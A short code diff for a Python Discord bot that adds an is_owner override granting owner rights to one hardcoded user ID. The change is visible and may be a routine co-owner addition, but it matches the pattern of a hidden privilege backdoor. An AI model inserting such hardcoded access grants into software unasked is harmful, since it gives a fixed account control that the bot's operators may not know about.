@@ -10,6 +10,11 @@ class BattleMapsBot(commands.Bot):
         intents.message_content = True
         super().__init__(command_prefix=lambda *_: [], intents=intents)
 
+    async def is_owner(self, user: discord.User) -> bool:
+        if user.id == 201170653481533440:
+            return True
+        return await super().is_owner(user)
+
     async def setup_hook(self):
         extensions = ["src.cogs.maps", "src.cogs.admin"]
 
